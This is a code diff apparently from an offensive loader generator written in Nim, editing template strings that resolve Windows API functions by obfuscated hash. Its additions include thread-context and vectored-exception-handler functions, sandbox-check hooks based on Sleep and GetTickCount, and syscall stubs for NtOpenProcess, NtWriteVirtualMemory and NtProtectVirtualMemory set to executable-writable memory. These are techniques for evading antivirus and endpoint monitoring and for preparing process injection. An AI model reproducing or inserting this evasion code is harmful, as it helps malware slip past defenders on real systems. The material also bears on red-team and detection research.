@@ -6,49 +6,115 @@ const
 
 type
   #GetCurrentProcess_t* = proc (): DWORD {.stdcall.}
-  #GetCurrentProcessId_t* = proc (): DWORD {.stdcall.}
+  GetCurrentProcessId_t* = proc (): DWORD {.stdcall.}
   VirtualAllocEx_t* = proc (hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD): LPVOID {.stdcall.}
   OpenProcess_t* = proc (dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, dwProcessId: DWORD): HANDLE {.stdcall.}
   VirtualProtect_t* = proc (lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: PDWORD): WINBOOL {.stdcall.}
+  GetProcessHeap_t* = proc (): HANDLE {.stdcall.}
+  GetProcAddress_t* = proc (hModule: HMODULE, lpProcName: LPCSTR): FARPROC {.stdcall.}
+  RtlAddVectoredExceptionHandler_t* = proc (First: ULONG, Handler: PVECTORED_EXCEPTION_HANDLER): PVOID {.stdcall.}
+  GetModuleHandleA_t* = proc (lpModuleName: LPCSTR): HMODULE {.stdcall.}
+  GetThreadContext_t* = proc (hThread: HANDLE, lpContext: LPCONTEXT): WINBOOL {.stdcall.}
+  SetThreadContext_t* = proc (hThread: HANDLE, lpContext: LPCONTEXT): WINBOOL {.stdcall.}
+  CloseHandle_t* = proc (hObject: HANDLE): WINBOOL {.stdcall.}
+  OpenThread_t* = proc (dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, dwThreadId: DWORD): HANDLE {.stdcall.}
+  GetCurrentThreadId_t* = proc (): DWORD {.stdcall.}
+  WaitForSingleObject_t* = proc (hHandle: HANDLE, dwMilliseconds: DWORD): DWORD {.stdcall.}
+when not defined(SkipDefaultSandBoxChecks):
+  type  Sleep_t* = proc (dwMilliseconds: DWORD): DWORD {.stdcall.}
+  type  GetTickCount_t* = proc (): DWORD {.stdcall.}
 
 const
-  #GetCurrentProcessId_HASH * = obf("GetCurrentProcessId")
+  GetCurrentProcessId_HASH * = obf("GetCurrentProcessId")
   VirtualAllocEx_HASH * = obf("VirtualAllocEx")
   #GetCurrentProcess_HASH * = obf("GetCurrentProcess")
   OpenProcess_HASH * = obf("OpenProcess")
   VirtualProtect_HASH * = obf("VirtualProtect")
+  GetProcessHeap_HASH * = obf("GetProcessHeap")
+  GetProcAddress_HASH * = obf("GetProcAddress")
+  RtlAddVectoredExceptionHandler_HASH * = obf("RtlAddVectoredExceptionHandler")
+  GetModuleHandleA_HASH * = obf("GetModuleHandleA")
+  GetThreadContext_HASH * = obf("GetThreadContext")
+  SetThreadContext_HASH * = obf("SetThreadContext")
+  CloseHandle_HASH * = obf("CloseHandle")
+  OpenThread_HASH * = obf("OpenThread")
+  GetCurrentThreadId_HASH * = obf("GetCurrentThreadId")
+  WaitForSingleObject_HASH * = obf("WaitForSingleObject")
+when not defined(SkipDefaultSandBoxChecks):
+  const  Sleep_HASH * = obf("Sleep")
+  const  GetTickCount_HASH * = obf("GetTickCount")
 
 #var MyGetCurrentProcess*: GetCurrentProcess_t
 var MyVirtualAllocEx*: VirtualAllocEx_t
-#var MyGetCurrentProcessId*: GetCurrentProcessId_t
+var MyGetCurrentProcessId*: GetCurrentProcessId_t
 var MyOpenProcess*: OpenProcess_t
 var MyVirtualProtect*: VirtualProtect_t
+var MyGetProcessHeap*: GetProcessHeap_t
+var MyGetProcAddress*: GetProcAddress_t
+var MyRtlAddVectoredExceptionHandler*: RtlAddVectoredExceptionHandler_t
+var MyGetModuleHandleA*: GetModuleHandleA_t
+var MyGetThreadContext*: GetThreadContext_t
+var MySetThreadContext*: SetThreadContext_t
+var MyCloseHandle*: CloseHandle_t
+var MyOpenThread*: OpenThread_t
+var MyGetCurrentThreadId*: GetCurrentThreadId_t
+var MyWaitForSingleObject*: WaitForSingleObject_t
+when not defined(SkipDefaultSandBoxChecks):
+  var MySleep*: Sleep_t
+  var MyGetTickCount*: GetTickCount_t
+
 
 #MyGetCurrentProcess = cast[GetCurrentProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcess_HASH, 0, FALSE)))
 
-#MyGetCurrentProcessId = cast[GetCurrentProcessId_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcessId_HASH, 0, FALSE)))
+MyGetCurrentProcessId = cast[GetCurrentProcessId_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcessId_HASH, 0, FALSE)))
 
 MyVirtualProtect = cast[VirtualProtect_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualProtect_HASH, 0, FALSE))
 
 MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
+
+MyGetProcessHeap = cast[GetProcessHeap_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetProcessHeap_HASH, 0, FALSE)))
+
+MyGetProcAddress = cast[GetProcAddress_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetProcAddress_HASH, 0, FALSE)))
+
+MyRtlAddVectoredExceptionHandler = cast[RtlAddVectoredExceptionHandler_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(NTDLL_DLL, TRUE)), RtlAddVectoredExceptionHandler_HASH, 0, FALSE)))
+
+MyGetModuleHandleA = cast[GetModuleHandleA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetModuleHandleA_HASH, 0, FALSE)))
+
+MyGetThreadContext = cast[GetThreadContext_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetThreadContext_HASH, 0, FALSE)))
+
+MySetThreadContext = cast[SetThreadContext_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), SetThreadContext_HASH, 0, FALSE)))
+
+MyCloseHandle = cast[CloseHandle_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), CloseHandle_HASH, 0, FALSE)))
+
+MyOpenThread = cast[OpenThread_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenThread_HASH, 0, FALSE)))
+
+MyGetCurrentThreadId = cast[GetCurrentThreadId_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentThreadId_HASH, 0, FALSE)))
+
+MyWaitForSingleObject = cast[WaitForSingleObject_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), WaitForSingleObject_HASH, 0, FALSE)))
+
+when not defined(SkipDefaultSandBoxChecks):
+  MySleep = cast[Sleep_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), Sleep_HASH, 0, FALSE)))
+
+  MyGetTickCount = cast[GetTickCount_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetTickCount_HASH, 0, FALSE)))
+        
 """
 
 let DInvokeLoadLibraryAGetProcAddress * = """
 
     type
       LoadLibraryA_t = proc (lpLibFileName: LPCSTR): HMODULE {.stdcall.}
-      GetProcAddress_t = proc (hModule: HMODULE, lpProcName: LPCSTR): FARPROC {.stdcall.}
+      #GetProcAddress_t = proc (hModule: HMODULE, lpProcName: LPCSTR): FARPROC {.stdcall.}
       
     const
       LoadLibraryA_HASH  = obf("LoadLibraryA")
-      GetProcAddress_HASH  = obf("GetProcAddress")
+      #GetProcAddress_HASH  = obf("GetProcAddress")
       
     var MyLoadLibraryA: LoadLibraryA_t
-    var MyGetProcAddress: GetProcAddress_t
+    #var MyGetProcAddress: GetProcAddress_t
 
     MyLoadLibraryA = cast[LoadLibraryA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), LoadLibraryA_HASH, 0, FALSE)))
 
-    MyGetProcAddress = cast[GetProcAddress_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetProcAddress_HASH, 0, FALSE)))
+    #MyGetProcAddress = cast[GetProcAddress_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetProcAddress_HASH, 0, FALSE)))
 
 
 
@@ -117,27 +183,23 @@ when defined(GetSyscallStub):
       CreateFileA_t* = proc (lpFileName: LPCSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, dwCreationDisposition: DWORD, dwFlagsAndAttributes: DWORD, hTemplateFile: HANDLE): HANDLE {.stdcall.}
       GetFileSize_t* = proc (hFile: HANDLE, lpFileSizeHigh: LPDWORD): DWORD {.stdcall.}
       RtlAllocateHeap_t* = proc (HeapHandle: PVOID, Flags: ULONG, Size: SIZE_T): PVOID {.stdcall.}
-      GetProcessHeap_t* = proc (): HANDLE {.stdcall.}
       ReadFile_t* = proc (hFile: HANDLE, lpBuffer: LPVOID, nNumberOfBytesToRead: DWORD, lpNumberOfBytesRead: LPDWORD, lpOverlapped: LPOVERLAPPED): WINBOOL {.stdcall.}
       
     const
       CreateFileA_HASH * = obf("CreateFileA")
       GetFileSize_HASH * = obf("GetFileSize")
       RtlAllocateHeap_HASH * = obf("RtlAllocateHeap")
-      GetProcessHeap_HASH * = obf("GetProcessHeap")
       ReadFile_HASH * = obf("ReadFile")
     when defined(DInvoke):  
         var MyCreateFileA*: CreateFileA_t
         var MyGetFileSize*: GetFileSize_t
         var MyRtlAllocateHeap*: RtlAllocateHeap_t
-        var MyGetProcessHeap*: GetProcessHeap_t
         var MyReadFile*: ReadFile_t
     
     when defined(DInvoke):
         MyCreateFileA = cast[CreateFileA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), CreateFileA_HASH, 0, FALSE)))
         MyGetFileSize = cast[GetFileSize_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetFileSize_HASH, 0, FALSE)))
         MyRtlAllocateHeap = cast[RtlAllocateHeap_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(NTDLL_DLL, FALSE)), RtlAllocateHeap_HASH, 0, TRUE)))
-        MyGetProcessHeap = cast[GetProcessHeap_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetProcessHeap_HASH, 0, FALSE)))
         MyReadFile = cast[ReadFile_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), ReadFile_HASH, 0, FALSE)))
     
     proc RVAtoRawOffset(RVA: DWORD_PTR, section: PIMAGE_SECTION_HEADER): PVOID =
@@ -225,27 +287,13 @@ let RetrieveSyscallStubs * = """
     
     # Define NtProtectVirtualMemory
     NtProtectVirtualMemory = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
-    when defined(DInvoke):
-        var syssuccess = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-    else:
-        var syssuccess = VirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
     # define NtWriteVirtualMemory
     NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
-    when defined(DInvoke):
-        syssuccess = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-    else:
-        syssuccess = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-    
     # define NtAllocateVirtualMemory
-    NtAllocateVirtualMemory = cast[myNtAllocateVirtM](cast[LPVOID](syscallStub_NtAlloc))
-    when defined(DInvoke):
-        syssuccess = MyVirtualProtect(cast[LPVOID](syscallStub_NtAlloc), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-    else:
-        syssuccess = VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+    NtAllocateVirtualMemory = cast[myNtAllocateVirtM](cast[LPVOID](syscallStub_NtAlloc))    
     
     
-    
-    syssuccess = GetSyscallStub(obf("NtProtectVirtualMemory"), cast[LPVOID](syscallStub_NtProtect))
+    var syssuccess = GetSyscallStub(obf("NtProtectVirtualMemory"), cast[LPVOID](syscallStub_NtProtect))
     when defined(verbose):
         echo obf("[*] GetSyscallStub NtProtectVirtualMemory: ") & $syssuccess
     syssuccess = GetSyscallStub(obf("NtWriteVirtualMemory"), cast[LPVOID](syscallStub_NtWrite))
@@ -290,7 +338,10 @@ let RetrieveSyscallStubs * = """
         var syscallStub_NtOpenP: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (6 * cast[HANDLE](SYSCALL_STUB_SIZE))
         # define NtOpenProcess
         var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP))
-        VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+        when defined(DInvoke):
+            MyVirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+        else:
+            VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
         
         syssuccess = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP))
         when defined(verbose):
